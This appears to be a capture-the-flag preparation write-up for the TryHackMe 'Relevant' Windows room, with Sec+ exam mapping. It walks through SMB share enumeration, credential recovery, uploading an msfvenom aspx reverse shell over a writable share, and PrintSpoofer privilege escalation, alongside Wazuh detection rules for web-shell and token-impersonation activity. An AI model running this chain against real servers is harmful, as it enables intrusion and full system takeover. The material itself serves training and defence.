# Relevant — TryHackMe

> **Preparation stub.** Based on publicly documented information about this room — not an original
> solve, and no live flag values are recorded. Use this as a study scaffold; complete the bracketed
> fields when working the box under your own account. Only document legally authorised activity.

## Engagement metadata

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Machine | Relevant |
| Difficulty | Medium |
| Category | Windows |
| Target IP | 10.10.x.x (lab-assigned) |
| Date completed | [YYYY-MM-DD] |

## Executive summary

A Windows Server exposing **SMB** and **IIS**. An anonymously-readable SMB share (`nt4wrksv`)
contains a `passwords.txt` file with **base64-encoded credentials**. The same share is **writable**
and is served by IIS on a high port, so an `.aspx` web shell can be **uploaded over SMB and executed
over HTTP**, yielding command execution as the IIS application-pool identity. That identity holds
**SeImpersonatePrivilege**, abused with PrintSpoofer/RoguePotato to escalate to **SYSTEM**.

## Key vulnerability class

- **CWE:** CWE-552 (files accessible to external parties) + CWE-276 (incorrect default permissions
  — writable share) leading to CWE-94 (code execution via uploaded web shell).
- **Why it matters:** a writable share that overlaps a web root is a classic upload-to-RCE chain, and
  SeImpersonate→SYSTEM is *the* canonical Windows service-account privesc — both heavily reused.

## 1. Reconnaissance

```
nmap -sC -sV -p- --min-rate 1000 -oA nmap/relevant 10.10.x.x
```

Expected exposed surface (confirm on completion):

| Port | Service | Note |
|------|---------|------|
| 80/tcp | http (IIS) | Default site |
| 135,139,445/tcp | msrpc / netbios / SMB | **The foothold (share)** |
| 3389/tcp | RDP | Lateral option if creds recovered |
| 49663/tcp | http (IIS) | **Serves the writable share — the upload target** |

**nmap flag rationale:**
- `-p-` — full range is essential here: the IIS instance that serves the share is on a **high
  ephemeral port (49663)** that a top-1000 scan misses entirely. This box is the textbook reason to
  scan all ports.
- `-sV` — confirms IIS on both 80 and the high port; the second HTTP service is the whole path.
- `-sC` — `smb-os-discovery`/`http-title` give early SMB + IIS context.

**What to look for:** two HTTP services (80 *and* a high port) plus SMB — the high-port IIS strongly
implies a non-default site, which here is the file share rendered over HTTP.

## 2. Enumeration

```
smbclient -N -L //10.10.x.x/                 # list shares anonymously
smbclient -N //10.10.x.x/nt4wrksv            # connect to the non-default share
# get passwords.txt
```
- The `nt4wrksv` share is **non-default** — always the interesting one. It is readable *and*
  writable anonymously.
- `passwords.txt` holds **base64** strings; decode (`base64 -d`) to recover `Bob`/`Bill` credentials.
- Confirm the share maps to the IIS high port: browse `http://10.10.x.x:49663/nt4wrksv/` and see the
  same file — proof that anything written to the share is web-served.

**Tool selection:** `smbclient`/`enum4linux-ng` for SMB; a browser/`curl` to prove the share↔web-root
overlap before uploading anything.

## 3. Exploitation

- Generate an `.aspx` reverse shell (`msfvenom -p windows/x64/shell_reverse_tcp ... -f aspx`).
- Upload it to the writable share over SMB (`put shell.aspx`).
- Trigger it via the IIS high port: `curl http://10.10.x.x:49663/nt4wrksv/shell.aspx` with a listener
  running → shell as the **IIS APPPOOL** identity.
- *Vector choice:* the SMB-write→HTTP-execute path is more reliable than chasing the base64 creds via
  RDP/WinRM, and it is the intended route. Record the alternative (RDP with recovered creds) as a
  considered-but-not-taken option.
- [User flag on completion.]

## 4. Post-exploitation (privilege escalation)

```
whoami /priv          # look for SeImpersonatePrivilege = Enabled
```
- SeImpersonatePrivilege present → use **PrintSpoofer** or **RoguePotato** to impersonate SYSTEM:
  `PrintSpoofer.exe -i -c cmd` (or a SYSTEM reverse shell).
- *Why this works:* the named-pipe/token impersonation tricks a SYSTEM service into handing over a
  token the app-pool account is allowed to impersonate — the standard service-account escalation.
- [Root/SYSTEM flag on completion.]

## 5. Tools used

`nmap`, `smbclient`/`enum4linux-ng`, `base64`, `msfvenom`, `curl`/browser, `nc`, `PrintSpoofer`/
`RoguePotato`.

## 6. MITRE ATT&CK mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Reconnaissance | Active scanning | T1595 |
| Initial Access / Credential Access | Unsecured credentials in files | T1552.001 |
| Persistence / Execution | Web shell | T1505.003 |
| Execution | Command/scripting interpreter | T1059 |
| Privilege Escalation | Access token manipulation — impersonation | T1134.001 |
| Lateral Movement (optional) | Valid accounts / RDP | T1078 / T1021.001 |

## 7. Key learnings

- **Scan all ports** — the high-port IIS service is the entire box; a default scan fails it.
- A share that is both **writable** and **web-served** is an upload-to-RCE primitive.
- SeImpersonate is the Windows privesc to recognise on sight from `whoami /priv`.

## 8. Defender perspective — logs & detection

- **SMB audit:** an anonymous session writing an `.aspx`/executable to a share — object-access
  auditing (**Event 4663**) on the share path; legitimate users rarely drop `.aspx` there.
- **IIS access log:** a `GET` to a newly-appeared `.aspx` under `/nt4wrksv/` — a web shell being
  triggered.
- **Sysmon Event 1:** `w3wp.exe` spawning `cmd.exe`/`powershell.exe` — an IIS worker spawning a
  shell is high-signal. PrintSpoofer adds a named-pipe creation (**Sysmon Event 17/18**) and a SYSTEM
  process spawned from the app-pool token.

### Wazuh detection rule (→ [watchtower](../../watchtower))

```xml
<group name="windows,sysmon,iis,attack,">
  <!-- IIS worker process spawning a shell = web-shell execution -->
  <rule id="100500" level="13">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.parentImage" type="pcre2">\\w3wp\.exe$</field>
    <field name="win.eventdata.image" type="pcre2">\\(cmd|powershell)\.exe$</field>
    <description>IIS w3wp spawned a shell — web-shell RCE (T1505.003/T1059)</description>
    <mitre><id>T1505.003</id><id>T1059</id></mitre>
  </rule>
  <!-- SYSTEM process spawned by an app-pool identity = token impersonation privesc -->
  <rule id="100501" level="14">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.user">NT AUTHORITY\\SYSTEM</field>
    <field name="win.eventdata.parentUser" type="pcre2">IIS APPPOOL|w3wp</field>
    <description>SYSTEM process from an app-pool parent — SeImpersonate privesc (T1134.001)</description>
    <mitre><id>T1134.001</id></mitre>
  </rule>
</group>
```
**Validation:** upload + trigger the aspx shell, then run PrintSpoofer; confirm 100500 then 100501.
Sub-techniques: **T1552.001**, **T1505.003**, **T1059**, **T1134.001**.

## Exam relevance — Sec+ SY0-701

| SY0-701 objective | How Relevant makes it concrete |
|-------------------|--------------------------------|
| **2.3** Vulnerability types — misconfiguration | Anonymous writable share overlapping a web root = weak configuration. |
| **2.2 / 4.6** Unsecured credentials | base64 "encoding ≠ encryption" — credentials in a readable file. |
| **2.2** Application attacks — web shell | Upload-to-execute is the application-attack pattern. |
| **4.1 / 3.1** Hardening & least privilege | Least-privilege the app-pool account; remove anonymous share write — both break the chain. |
| **2.4** Indicators | `w3wp.exe`→`cmd.exe` and SeImpersonate use are the indicators (§8). |

**Interview line:** "Relevant is two misconfigurations stacking — an anonymous writable share that's
also a web root, then a service account with SeImpersonate. Either fix alone breaks the whole chain."

## 9. References

- PrintSpoofer / RoguePotato — `SeImpersonatePrivilege` abuse references.
- Microsoft IIS application-pool identity documentation.
- MITRE ATT&CK T1552.001 / T1505.003 / T1059 / T1134.001.
